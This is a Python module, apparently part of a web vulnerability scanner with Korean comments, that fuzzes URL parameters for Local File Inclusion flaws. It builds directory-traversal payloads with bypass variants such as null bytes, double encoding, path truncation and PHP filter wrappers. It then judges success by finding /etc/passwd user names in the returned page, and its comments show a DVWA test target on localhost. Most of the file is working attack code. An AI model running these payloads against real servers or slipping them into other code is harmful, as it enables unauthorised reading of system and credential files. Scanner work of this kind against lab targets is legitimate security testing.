from fuzzingbook.WebFuzzer import *
from lfi_bypass import *


def find_target_url(urls) -> list[str]:  # LFI 공격이 가능한 URL을 찾는 함수
    # http://localhost/vulnerabilities/fi/?page=file1.php
    # -> http://localhost/vulnerabilities/fi/?page=

    target_urls: list[str] = []

    for url in urls:
        parsed_url: list[str] = url.split('/')  # '/' 를 기준으로 URL 분할
        target: str = parsed_url[-1]  # 가장 마지막 '/' 오른쪽에 있는 문자열 추출

        # 위에서 추출한 문자열이 공백이 아니고 '?' 로 시작하고 '=' 가 있으면
        if (target != '') and (target[0] == '?') and ('=' in target):
            index = url.rfind('=')  # 문자열 뒤에서 부터 '=' 가 있는지 탐색하여 인덱스 반환

            target_urls.append(url[:index + 1])  # target_urls에 원본 URL에서 타겟 URL만 잘라서 저장

    target_urls = list(set(target_urls))  # 중복 제거

    return target_urls


def get_target_path(target_file) -> list[str]:  # 읽고 싶은 파일을 받은 후 다양한 경로를 생성
    target_path: list[str] = ['/' + target_file]

    for _ in range(10):
        target_file = '../' + target_file
        target_path.append(target_file)

    return target_path


def generate_payload(urls, target_file, count) -> list[str]:  # 페이로드를 생성해주는 함수
    payloads: list[str] = []
    target_paths: list[str] = get_target_path(target_file)

    for target_path in target_paths:
        LFI_Grammar: Grammar = {
            '<start>': ['<lfi>'],
            '<lfi>': ['<url><target-path>'],
            '<url>': find_target_url(urls),
            '<target-path>': [basic_file_leak(target_path), null_byte(target_path), encoding(target_path),
                              double_encoding(target_path), path_dot_truncation1(target_path),
                              path_dot_truncation2(target_path), path_dot_truncation3(target_path),
                              tricks1(target_path), tricks2(target_path), rot13_wrapper(target_file),
                              utf16_wrapper(target_file), base64_wrapper(target_file)]
        }

        for _ in range(count):
            lfi_fuzzer = GrammarFuzzer(LFI_Grammar)
            payload: str = lfi_fuzzer.fuzz()
            payloads.append(payload)

    payloads = list(set(payloads))

    return payloads


def detect_lfi(driver, url, payload) -> dict:  # LFI 취약점이 발생했는지 탐지하는 함수
    result = {"Vulnerability": "", "URL": "", "Method": "", "Payload": ""}

    driver.get(payload)  # payload를 담은 URL 요청
    page_source = driver.page_source  # 해당 페이지의 소스 코드 추출

    # /etc/passwd 파일에 반드시 존재하는 유저들이 출력되었는지 확인하여 공격 성공 유무를 판단
    if page_source.count('root') > 0 and page_source.count('daemon') > 0 and page_source.count('sys') > 0:
        result["Vulnerability"] = "Local File Inclusion"
        result["URL"] = url
        result["Method"] = "get"
        result["Payload"] = payload

    return result

